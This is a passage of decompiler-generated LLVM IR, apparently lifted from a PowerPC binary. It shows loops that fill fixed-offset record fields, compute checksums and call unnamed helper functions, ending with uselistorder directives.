  %v2_10003f50 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f50 = add i32 %v2_10003f50, 20
  %v4_10003f50 = inttoptr i32 %v3_10003f50 to i16*
  store i16 %v1_10003f50, i16* %v4_10003f50, align 2
  %v3_10003f54 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10003f54, i32* %r9.global-to-local, align 4
  %v0_10003f58 = load i32, i32* %r23.global-to-local, align 4
  %v1_10003f58 = trunc i32 %v0_10003f58 to i16
  %v2_10003f58 = load i32, i32* %r11.global-to-local, align 4
  %v3_10003f58 = add i32 %v2_10003f58, 2
  %v4_10003f58 = inttoptr i32 %v3_10003f58 to i16*
  store i16 %v1_10003f58, i16* %v4_10003f58, align 2
  %v0_10003f5c = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f5c = mul i32 %v0_10003f5c, 24
  %v1_10003f60 = load i32, i32* %r27.global-to-local, align 4
  %v2_10003f60 = add i32 %v1_10003f60, %v1_10003f5c
  store i32 %v2_10003f60, i32* %r9.global-to-local, align 4
  %v1_10003f64 = add i32 %v2_10003f60, 16
  %v2_10003f64 = inttoptr i32 %v1_10003f64 to i32*
  %v3_10003f64 = load i32, i32* %v2_10003f64, align 4
  store i32 %v3_10003f64, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_10003f6c = load i32, i32* %r31.global-to-local, align 4
  %v2_10003f6c = add i32 %v1_10003f6c, 16
  %v3_10003f6c = inttoptr i32 %v2_10003f6c to i32*
  store i32 %v3_10003f64, i32* %v3_10003f6c, align 4
  %v0_10003f70 = load i32, i32* %r19.global-to-local, align 4
  %v1_10003f70 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003f70 = add i32 %v1_10003f70, 4
  %v3_10003f70 = inttoptr i32 %v2_10003f70 to i32*
  store i32 %v0_10003f70, i32* %v3_10003f70, align 4
  %v0_10003f74 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003f74 = add i32 %v0_10003f74, 12
  %v2_10003f74 = inttoptr i32 %v1_10003f74 to i32*
  %v3_10003f74 = load i32, i32* %v2_10003f74, align 4
  store i32 %v3_10003f74, i32* %r0.global-to-local, align 4
  %v1_10003f78 = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  store i32 %v1_10003f78, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10003f80 = call i32 @__asm_rlwimi(i32 %v1_10003ed8, i32 21, i32 10, i32 10)
  store i32 %v1_10003f80, i32* %r0.global-to-local, align 4
  %v1_10003f84 = call i32 @__asm_rlwimi(i32 %v1_10003ec8, i32 20, i32 11, i32 11)
  store i32 %v1_10003f84, i32* %r0.global-to-local, align 4
  %v1_10003f88 = call i32 @__asm_rlwimi(i32 %v1_10003ecc, i32 19, i32 12, i32 12)
  store i32 %v1_10003f88, i32* %r0.global-to-local, align 4
  %v1_10003f8c = call i32 @__asm_rlwimi(i32 %v1_10003ed0, i32 18, i32 13, i32 13)
  store i32 %v1_10003f8c, i32* %r0.global-to-local, align 4
  %v1_10003f90 = call i32 @__asm_rlwimi(i32 %v1_10003ec4, i32 17, i32 14, i32 14)
  store i32 %v1_10003f90, i32* %r0.global-to-local, align 4
  %v1_10003f94 = call i32 @__asm_rlwimi(i32 %v1_10003ed4, i32 16, i32 15, i32 15)
  %v1_10003f98 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003f98 = add i32 %v1_10003f98, 12
  %v3_10003f98 = inttoptr i32 %v2_10003f98 to i32*
  store i32 %v1_10003f94, i32* %v3_10003f98, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_10003fa0 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fa0 = add i32 %v2_10003fa0, 40
  %v4_10003fa0 = inttoptr i32 %v3_10003fa0 to i8*
  store i8 2, i8* %v4_10003fa0, align 1
  %v0_10003fa4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003fa4 = trunc i32 %v0_10003fa4 to i8
  %v2_10003fa4 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fa4 = add i32 %v2_10003fa4, 41
  %v4_10003fa4 = inttoptr i32 %v3_10003fa4 to i8*
  store i8 %v1_10003fa4, i8* %v4_10003fa4, align 1
  %v0_10003fa8 = call i32 @function_10006318()
  %v2_10003fb0 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fb0 = add i32 %v2_10003fb0, 46
  %v4_10003fb0 = inttoptr i32 %v3_10003fb0 to i8*
  store i8 8, i8* %v4_10003fb0, align 1
  %v1_10003fb4 = urem i32 %v0_10003fa8, 16
  store i32 %v1_10003fb4, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v2_10003fc0 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fc0 = add i32 %v2_10003fc0, 44
  %v4_10003fc0 = inttoptr i32 %v3_10003fc0 to i8*
  store i8 4, i8* %v4_10003fc0, align 1
  %v0_10003fc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10003fc4 = add i32 %v0_10003fc4, 1400
  store i32 %v1_10003fc4, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_10003fcc = load i32, i32* %r9.global-to-local, align 4
  %v1_10003fcc = trunc i32 %v0_10003fcc to i8
  %v2_10003fcc = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fcc = add i32 %v2_10003fcc, 45
  %v4_10003fcc = inttoptr i32 %v3_10003fcc to i8*
  store i8 %v1_10003fcc, i8* %v4_10003fcc, align 1
  %v0_10003fd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003fd0 = trunc i32 %v0_10003fd0 to i8
  %v2_10003fd0 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fd0 = add i32 %v2_10003fd0, 47
  %v4_10003fd0 = inttoptr i32 %v3_10003fd0 to i8*
  store i8 %v1_10003fd0, i8* %v4_10003fd0, align 1
  %v0_10003fd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10003fd4 = trunc i32 %v0_10003fd4 to i16
  %v2_10003fd4 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fd4 = add i32 %v2_10003fd4, 42
  %v4_10003fd4 = inttoptr i32 %v3_10003fd4 to i16*
  store i16 %v1_10003fd4, i16* %v4_10003fd4, align 2
  %v0_10003fd8 = call i32 @function_10006318()
  store i32 %v0_10003fd8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v1_10003fe4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003fe4 = add i32 %v1_10003fe4, 52
  %v3_10003fe4 = inttoptr i32 %v2_10003fe4 to i32*
  store i32 0, i32* %v3_10003fe4, align 4
  %v0_10003fe8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003fe8 = trunc i32 %v0_10003fe8 to i8
  %v2_10003fe8 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003fe8 = add i32 %v2_10003fe8, 56
  %v4_10003fe8 = inttoptr i32 %v3_10003fe8 to i8*
  store i8 %v1_10003fe8, i8* %v4_10003fe8, align 1
  store i32 6, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r9.global-to-local, align 4
  %v1_10003ff4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003ff4 = add i32 %v1_10003ff4, 48
  %v3_10003ff4 = inttoptr i32 %v2_10003ff4 to i32*
  store i32 %v0_10003fd8, i32* %v3_10003ff4, align 4
  %v0_10003ff8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003ff8 = trunc i32 %v0_10003ff8 to i8
  %v2_10003ff8 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003ff8 = add i32 %v2_10003ff8, 59
  %v4_10003ff8 = inttoptr i32 %v3_10003ff8 to i8*
  store i8 %v1_10003ff8, i8* %v4_10003ff8, align 1
  %v0_10003ffc = load i32, i32* %r9.global-to-local, align 4
  %v1_10003ffc = trunc i32 %v0_10003ffc to i8
  %v2_10003ffc = load i32, i32* %r31.global-to-local, align 4
  %v3_10003ffc = add i32 %v2_10003ffc, 57
  %v4_10003ffc = inttoptr i32 %v3_10003ffc to i8*
  store i8 %v1_10003ffc, i8* %v4_10003ffc, align 1
  %v0_10004000 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004000 = trunc i32 %v0_10004000 to i8
  %v2_10004000 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004000 = add i32 %v2_10004000, 58
  %v4_10004000 = inttoptr i32 %v3_10004000 to i8*
  store i8 %v1_10004000, i8* %v4_10004000, align 1
  %v3_10004004 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10004004, i32* %r9.global-to-local, align 4
  %v1_10004008 = add i32 %v3_10004004, 1
  store i32 %v1_10004008, i32* %r31.global-to-local, align 4
  %v1_1000400c = load i32, i32* %r24.global-to-local, align 4
  %v2_1000400c = icmp slt i32 %v1_10004008, %v1_1000400c
  store i32 %v1_10004008, i32* %stack_var_-120, align 4
  br i1 %v2_1000400c, label %dec_label_pc_10003ee0, label %dec_label_pc_10004018.loopexit

dec_label_pc_10004018.loopexit:                   ; preds = %dec_label_pc_10003f44
  %v0_1000401c.pre = load i32, i32* %r14.global-to-local, align 4
  %v0_10004020.pre.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004020.pre.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10004018

dec_label_pc_10004018:                            ; preds = %dec_label_pc_10004018.loopexit, %dec_label_pc_10003e9c
  %v1_10004020.pre = phi i1 [ %v1_10004020.pre.pre, %dec_label_pc_10004018.loopexit ], [ %v1_10003e9c, %dec_label_pc_10003e9c ]
  %v0_10004020.pre = phi i1 [ %v0_10004020.pre.pre, %dec_label_pc_10004018.loopexit ], [ %v3_10003e9c, %dec_label_pc_10003e9c ]
  %v0_1000401c = phi i32 [ %v0_1000401c.pre, %dec_label_pc_10004018.loopexit ], [ %v1_10003eb4, %dec_label_pc_10003e9c ]
  %v0_10004018 = load i32, i32* %r15.global-to-local, align 4
  %v3_10004018 = icmp eq i32 %v0_10004018, -1
  store i1 %v3_10004018, i1* %cr2_eq.global-to-local, align 1
  %v3_1000401c = icmp eq i32 %v0_1000401c, 0
  store i1 %v3_1000401c, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10004020.outer

dec_label_pc_10004020.outer:                      ; preds = %dec_label_pc_100040fc, %dec_label_pc_10004018
  %v1_10004020.ph = phi i1 [ %v1_10004020.pre, %dec_label_pc_10004018 ], [ %v1_100040fc, %dec_label_pc_100040fc ]
  %v0_10004020.ph = phi i1 [ %v0_10004020.pre, %dec_label_pc_10004018 ], [ %v0_100040fc, %dec_label_pc_100040fc ]
  %v2_10004020 = or i1 %v1_10004020.ph, %v0_10004020.ph
  br label %dec_label_pc_10004020

dec_label_pc_10004020:                            ; preds = %dec_label_pc_10004020.outer, %dec_label_pc_10004020
  br i1 %v2_10004020, label %dec_label_pc_10004020, label %dec_label_pc_10004024

dec_label_pc_10004024:                            ; preds = %dec_label_pc_10004020, %dec_label_pc_100040fc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-120, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004034

dec_label_pc_10004034:                            ; preds = %dec_label_pc_1000408c, %dec_label_pc_10004024
  %v0_10004034 = phi i32 [ %v1_100040ec, %dec_label_pc_1000408c ], [ 0, %dec_label_pc_10004024 ]
  %v1_10004034 = mul i32 %v0_10004034, 24
  store i32 %v1_10004034, i32* %r0.global-to-local, align 4
  %v1_10004038 = mul i32 %v0_10004034, 4
  store i32 %v1_10004038, i32* %r11.global-to-local, align 4
  %v1_1000403c = load i32, i32* %r25.global-to-local, align 4
  %v2_1000403c = add i32 %v1_1000403c, %v1_10004038
  %v3_1000403c = inttoptr i32 %v2_1000403c to i32*
  %v4_1000403c = load i32, i32* %v3_1000403c, align 4
  store i32 %v4_1000403c, i32* %r28.global-to-local, align 4
  %v1_10004040 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004040 = add i32 %v1_10004040, %v1_10004034
  %v1_10004044 = add i32 %v2_10004040, 20
  %v2_10004044 = inttoptr i32 %v1_10004044 to i8*
  %v3_10004044 = load i8, i8* %v2_10004044, align 1
  %v4_10004044 = zext i8 %v3_10004044 to i32
  store i32 %v4_10004044, i32* %r9.global-to-local, align 4
  %v1_10004048 = add i32 %v4_1000403c, 20
  store i32 %v1_10004048, i32* @r31, align 4
  %tmp41 = icmp ult i8 %v3_10004044, 32
  br i1 %tmp41, label %dec_label_pc_10004104, label %dec_label_pc_10004054

dec_label_pc_10004054:                            ; preds = %dec_label_pc_10004034
  %v0_10004054 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004054, label %dec_label_pc_1000412c, label %dec_label_pc_10004058

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004104, %dec_label_pc_10004054
  store i32 65535, i32* %r29.global-to-local, align 4
  %v0_10004060 = load i32, i32* %r21.global-to-local, align 4
  %v4_10004060 = icmp eq i32 %v0_10004060, 65535
  br i1 %v4_10004060, label %dec_label_pc_10004144, label %dec_label_pc_10004068

dec_label_pc_10004068:                            ; preds = %dec_label_pc_1000412c, %dec_label_pc_10004058
  %v1_10004068 = phi i32 [ %v1_1000413c, %dec_label_pc_1000412c ], [ 65535, %dec_label_pc_10004058 ]
  %v0_10004068 = load i32, i32* %r22.global-to-local, align 4
  %v4_10004068 = icmp eq i32 %v0_10004068, %v1_10004068
  br i1 %v4_10004068, label %dec_label_pc_10004154, label %dec_label_pc_10004070

dec_label_pc_10004070:                            ; preds = %dec_label_pc_10004144.dec_label_pc_10004070_crit_edge, %dec_label_pc_10004068
  %v1_10004070 = phi i32 [ %v1_10004070.pre, %dec_label_pc_10004144.dec_label_pc_10004070_crit_edge ], [ %v1_10004068, %dec_label_pc_10004068 ]
  %v0_10004070 = load i32, i32* %r23.global-to-local, align 4
  %v4_10004070 = icmp eq i32 %v0_10004070, %v1_10004070
  br i1 %v4_10004070, label %dec_label_pc_10004164, label %dec_label_pc_10004078

dec_label_pc_10004078:                            ; preds = %dec_label_pc_10004154.dec_label_pc_10004078_crit_edge, %dec_label_pc_10004070
  %v1_10004078 = phi i32 [ %v1_10004078.pre, %dec_label_pc_10004154.dec_label_pc_10004078_crit_edge ], [ %v1_10004070, %dec_label_pc_10004070 ]
  %v0_10004078 = load i32, i32* %r19.global-to-local, align 4
  %v4_10004078 = icmp eq i32 %v0_10004078, %v1_10004078
  br i1 %v4_10004078, label %dec_label_pc_10004174, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004164.dec_label_pc_10004080_crit_edge, %dec_label_pc_10004078
  %v1_10004080 = phi i32 [ %v1_10004080.pre, %dec_label_pc_10004164.dec_label_pc_10004080_crit_edge ], [ %v1_10004078, %dec_label_pc_10004078 ]
  %v0_10004080 = load i32, i32* %r20.global-to-local, align 4
  %v4_10004080 = icmp eq i32 %v0_10004080, %v1_10004080
  br i1 %v4_10004080, label %dec_label_pc_10004184, label %dec_label_pc_10004088

dec_label_pc_10004088:                            ; preds = %dec_label_pc_10004174, %dec_label_pc_10004080
  %v0_10004088 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004088, label %dec_label_pc_1000408c, label %dec_label_pc_10004190

dec_label_pc_1000408c:                            ; preds = %dec_label_pc_10004088, %dec_label_pc_10004184, %dec_label_pc_10004190
  %v0_1000408c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000408c = trunc i32 %v0_1000408c to i16
  %v2_1000408c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000408c = add i32 %v2_1000408c, 10
  %v4_1000408c = inttoptr i32 %v3_1000408c to i16*
  store i16 %v1_1000408c, i16* %v4_1000408c, align 2
  %v0_10004094 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10004094, i32* @r3, align 4
  %v2_10004098 = call i32 @function_1000491c(i32 %v0_10004094, i32 20)
  %v3_10004098 = trunc i32 %v2_10004098 to i16
  %v0_1000409c = load i32, i32* @r31, align 4
  store i32 %v0_1000409c, i32* @r4, align 4
  %v4_100040a0 = add i32 %v0_10004094, 10
  %v5_100040a0 = inttoptr i32 %v4_100040a0 to i16*
  store i16 %v3_10004098, i16* %v5_100040a0, align 2
  %v0_100040a8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100040a8 = trunc i32 %v0_100040a8 to i16
  %v2_100040a8 = load i32, i32* @r31, align 4
  %v3_100040a8 = add i32 %v2_100040a8, 16
  %v4_100040a8 = inttoptr i32 %v3_100040a8 to i16*
  store i16 %v1_100040a8, i16* %v4_100040a8, align 2
  %v0_100040b0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100040b0, i32* %r3.global-to-local, align 4
  %v4_100040b4 = call i32 @function_10004980(i32 %v0_100040b0, i32 %v0_1000409c, i32 40, i32 40)
  %v5_100040b4 = trunc i32 %v4_100040b4 to i16
  store i32 %v4_100040b4, i32* %r3.global-to-local, align 4
  %v3_100040b8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100040b8, i32* %r7.global-to-local, align 4
  %v0_100040bc = load i32, i32* @r31, align 4
  %v1_100040bc = add i32 %v0_100040bc, 2
  %v2_100040bc = inttoptr i32 %v1_100040bc to i16*
  %v3_100040bc = load i16, i16* %v2_100040bc, align 2
  %v4_100040bc = zext i16 %v3_100040bc to i32
  store i32 %v4_100040bc, i32* %r0.global-to-local, align 4
  %v0_100040c0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100040c4 = mul i32 %v3_100040b8, 24
  store i32 %v1_100040c4, i32* %r7.global-to-local, align 4
  %v4_100040c8 = add i32 %v0_100040bc, 16
  %v5_100040c8 = inttoptr i32 %v4_100040c8 to i16*
  store i16 %v5_100040b4, i16* %v5_100040c8, align 2
  %v0_100040d0 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100040d0, i32* %r3.global-to-local, align 4
  %v0_100040d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100040d4 = load i32, i32* %r27.global-to-local, align 4
  %v2_100040d4 = add i32 %v1_100040d4, %v0_100040d4
  store i32 %v2_100040d4, i32* %r7.global-to-local, align 4
  %v0_100040dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100040dc = trunc i32 %v0_100040dc to i16
  %v3_100040dc = add i32 %v2_100040d4, 2
  %v4_100040dc = inttoptr i32 %v3_100040dc to i16*
  store i16 %v1_100040dc, i16* %v4_100040dc, align 2
  store i32 268452072, i32* @lr, align 4
  %v6_100040e4 = call i32 @function_10008ab8(i32 %v0_100040d0, i32 %v0_100040c0, i32 60, i32 16384, i32 %v2_100040d4, i32 16)
  store i32 %v6_100040e4, i32* %r3.global-to-local, align 4
  %v3_100040e8 = load i32, i32* %stack_var_-120, align 4
  %v1_100040ec = add i32 %v3_100040e8, 1
  store i32 %v1_100040ec, i32* %r9.global-to-local, align 4
  %v1_100040f0 = load i32, i32* %r24.global-to-local, align 4
  %v2_100040f0 = icmp slt i32 %v1_100040ec, %v1_100040f0
  store i32 %v1_100040ec, i32* %stack_var_-120, align 4
  br i1 %v2_100040f0, label %dec_label_pc_10004034, label %dec_label_pc_100040fc

dec_label_pc_100040fc:                            ; preds = %dec_label_pc_1000408c
  %v0_100040fc = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100040fc = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100040fc = or i1 %v0_100040fc, %v1_100040fc
  br i1 %v2_100040fc, label %dec_label_pc_10004020.outer, label %dec_label_pc_10004024

dec_label_pc_10004104:                            ; preds = %dec_label_pc_10004034
  %v1_10004104 = add i32 %v2_10004040, 16
  %v2_10004104 = inttoptr i32 %v1_10004104 to i32*
  %v3_10004104 = load i32, i32* %v2_10004104, align 4
  store i32 %v3_10004104, i32* %r29.global-to-local, align 4
  %v0_10004108 = call i32 @function_10006318()
  store i32 %v0_10004108, i32* %r3.global-to-local, align 4
  %v3_1000410c = load i32, i32* %stack_var_-120, align 4
  %v1_10004110 = mul i32 %v3_1000410c, 24
  %v1_10004114 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004114 = add i32 %v1_10004114, %v1_10004110
  store i32 %v2_10004114, i32* %r9.global-to-local, align 4
  %v1_10004118 = add i32 %v2_10004114, 20
  %v2_10004118 = inttoptr i32 %v1_10004118 to i8*
  %v3_10004118 = load i8, i8* %v2_10004118, align 1
  %v4_10004118 = zext i8 %v3_10004118 to i32
  store i32 %v4_10004118, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004118, 64
  %v2_1000411c = zext i8 %tmp to i32
  %v3_1000411c = lshr i32 %v0_10004108, %v2_1000411c
  store i32 %v3_1000411c, i32* %r3.global-to-local, align 4
  %v0_10004120 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004120 = add i32 %v3_1000411c, %v0_10004120
  store i32 %v2_10004120, i32* %r29.global-to-local, align 4
  %v1_10004124 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004124 = add i32 %v1_10004124, 16
  %v3_10004124 = inttoptr i32 %v2_10004124 to i32*
  store i32 %v2_10004120, i32* %v3_10004124, align 4
  %v0_10004128 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004128, label %dec_label_pc_1000412c, label %dec_label_pc_10004058

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_10004104, %dec_label_pc_10004054
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10004130 = call i32 @function_10006318()
  store i32 %v0_10004130, i32* %r3.global-to-local, align 4
  store i32 65535, i32* %r29.global-to-local, align 4
  %v1_10004138 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004138 = add i32 %v1_10004138, 12
  %v3_10004138 = inttoptr i32 %v2_10004138 to i32*
  store i32 %v0_10004130, i32* %v3_10004138, align 4
  %v0_1000413c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000413c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000413c = icmp eq i32 %v0_1000413c, %v1_1000413c
  br i1 %v4_1000413c, label %dec_label_pc_10004144, label %dec_label_pc_10004068

dec_label_pc_10004144:                            ; preds = %dec_label_pc_1000412c, %dec_label_pc_10004058
  %v0_10004144 = call i32 @function_10006318()
  %v1_10004144 = trunc i32 %v0_10004144 to i16
  store i32 %v0_10004144, i32* %r3.global-to-local, align 4
  %v0_10004148 = load i32, i32* %r22.global-to-local, align 4
  %v1_10004148 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004148 = icmp eq i32 %v0_10004148, %v1_10004148
  %v3_1000414c = load i32, i32* %r28.global-to-local, align 4
  %v4_1000414c = add i32 %v3_1000414c, 4
  %v5_1000414c = inttoptr i32 %v4_1000414c to i16*
  store i16 %v1_10004144, i16* %v5_1000414c, align 2
  br i1 %v4_10004148, label %dec_label_pc_10004154, label %dec_label_pc_10004144.dec_label_pc_10004070_crit_edge

dec_label_pc_10004144.dec_label_pc_10004070_crit_edge: ; preds = %dec_label_pc_10004144
  %v1_10004070.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004070

dec_label_pc_10004154:                            ; preds = %dec_label_pc_10004144, %dec_label_pc_10004068
  %v0_10004154 = call i32 @function_10006318()
  %v1_10004154 = trunc i32 %v0_10004154 to i16
  store i32 %v0_10004154, i32* %r3.global-to-local, align 4
  %v0_10004158 = load i32, i32* %r23.global-to-local, align 4
  %v1_10004158 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004158 = icmp eq i32 %v0_10004158, %v1_10004158
  %v3_1000415c = load i32, i32* %r28.global-to-local, align 4
  %v4_1000415c = add i32 %v3_1000415c, 20
  %v5_1000415c = inttoptr i32 %v4_1000415c to i16*
  store i16 %v1_10004154, i16* %v5_1000415c, align 2
  br i1 %v4_10004158, label %dec_label_pc_10004164, label %dec_label_pc_10004154.dec_label_pc_10004078_crit_edge

dec_label_pc_10004154.dec_label_pc_10004078_crit_edge: ; preds = %dec_label_pc_10004154
  %v1_10004078.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004078

dec_label_pc_10004164:                            ; preds = %dec_label_pc_10004154, %dec_label_pc_10004070
  %v0_10004164 = call i32 @function_10006318()
  %v1_10004164 = trunc i32 %v0_10004164 to i16
  store i32 %v0_10004164, i32* %r3.global-to-local, align 4
  %v0_10004168 = load i32, i32* %r19.global-to-local, align 4
  %v1_10004168 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004168 = icmp eq i32 %v0_10004168, %v1_10004168
  %v3_1000416c = load i32, i32* @r31, align 4
  %v4_1000416c = add i32 %v3_1000416c, 2
  %v5_1000416c = inttoptr i32 %v4_1000416c to i16*
  store i16 %v1_10004164, i16* %v5_1000416c, align 2
  br i1 %v4_10004168, label %dec_label_pc_10004174, label %dec_label_pc_10004164.dec_label_pc_10004080_crit_edge

dec_label_pc_10004164.dec_label_pc_10004080_crit_edge: ; preds = %dec_label_pc_10004164
  %v1_10004080.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004080

dec_label_pc_10004174:                            ; preds = %dec_label_pc_10004164, %dec_label_pc_10004078
  %v0_10004174 = call i32 @function_10006318()
  store i32 %v0_10004174, i32* %r3.global-to-local, align 4
  %v0_10004178 = load i32, i32* %r20.global-to-local, align 4
  %v1_10004178 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004178 = icmp eq i32 %v0_10004178, %v1_10004178
  %v1_1000417c = load i32, i32* @r31, align 4
  %v2_1000417c = add i32 %v1_1000417c, 4
  %v3_1000417c = inttoptr i32 %v2_1000417c to i32*
  store i32 %v0_10004174, i32* %v3_1000417c, align 4
  br i1 %v4_10004178, label %dec_label_pc_10004184, label %dec_label_pc_10004088

dec_label_pc_10004184:                            ; preds = %dec_label_pc_10004174, %dec_label_pc_10004080
  %v0_10004184 = call i32 @function_10006318()
  store i32 %v0_10004184, i32* %r3.global-to-local, align 4
  %v1_10004188 = load i32, i32* @r31, align 4
  %v2_10004188 = add i32 %v1_10004188, 8
  %v3_10004188 = inttoptr i32 %v2_10004188 to i32*
  store i32 %v0_10004184, i32* %v3_10004188, align 4
  %v0_1000418c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000418c, label %dec_label_pc_1000408c, label %dec_label_pc_10004190

dec_label_pc_10004190:                            ; preds = %dec_label_pc_10004088, %dec_label_pc_10004184
  %v0_10004190 = call i32 @function_10006318()
  %v1_10004190 = trunc i32 %v0_10004190 to i16
  store i32 %v0_10004190, i32* %r3.global-to-local, align 4
  %v3_10004194 = load i32, i32* @r31, align 4
  %v4_10004194 = add i32 %v3_10004194, 18
  %v5_10004194 = inttoptr i32 %v4_10004194 to i16*
  store i16 %v1_10004190, i16* %v5_10004194, align 2
  br label %dec_label_pc_1000408c

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10003e78
  %v0_1000419c = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_1000419c, i32* %r3.global-to-local, align 4
  store i32 268452260, i32* @lr, align 4
  %v0_100041a0 = call i32 @function_10007d68()
  store i32 %v0_100041a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100041a4

dec_label_pc_100041a4:                            ; preds = %dec_label_pc_10003c60, %dec_label_pc_1000419c
  store i32 %v0_10003c78, i32* %r0.global-to-local, align 4
  %v1_100041b8 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003c68)
  store i32 %v0_10003cb8, i32* %r28.global-to-local, align 4
  store i32 %v0_10003cc0, i32* %r29.global-to-local, align 4
  store i32 %v0_10003ccc, i32* %r31.global-to-local, align 4
  %v0_10004200 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004200

; uselistorder directives
  uselistorder i32 %v0_10004190, { 1, 0 }
  uselistorder i32 %v0_10004164, { 1, 0 }
  uselistorder i32 %v0_10004154, { 1, 0 }
  uselistorder i32 %v0_10004144, { 1, 0 }
  uselistorder i32 %v1_1000413c, { 1, 0 }
  uselistorder i1 %v1_100040fc, { 1, 0 }
  uselistorder i1 %v0_100040fc, { 1, 0 }
  uselistorder i32 %v1_100040ec, { 0, 2, 3, 1 }
  uselistorder i32 %v4_100040b4, { 1, 0 }
  uselistorder i32 %v1_10004038, { 1, 0 }
  uselistorder i32 %v1_10003ef8, { 1, 0 }
  uselistorder i32 %v1_10003ef0, { 1, 0 }
  uselistorder i32 %v1_10003ed8, { 1, 0 }
  uselistorder i32 %v1_10003ed4, { 1, 0 }
  uselistorder i32 %v1_10003ed0, { 1, 0 }
  uselistorder i32 %v1_10003ecc, { 1, 0 }
  uselistorder i32 %v1_10003ec8, { 1, 0 }
  uselistorder i32 %v1_10003ec4, { 1, 0 }
  uselistorder i32 %v1_10003eb4, { 1, 0 }
  uselistorder i8 %v5_10003d30, { 1, 0 }
  uselistorder i8 %v5_10003cf8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 2, 29, 30, 31, 32, 33, 34, 4, 35, 3, 37, 38, 39, 40, 41, 42, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 10, 7, 11, 9, 12, 8, 13, 1, 2, 4, 3, 5, 6, 14, 15 }
  uselistorder i32* %r23.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r22.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r17.global-to-local, { 2, 0, 1 }
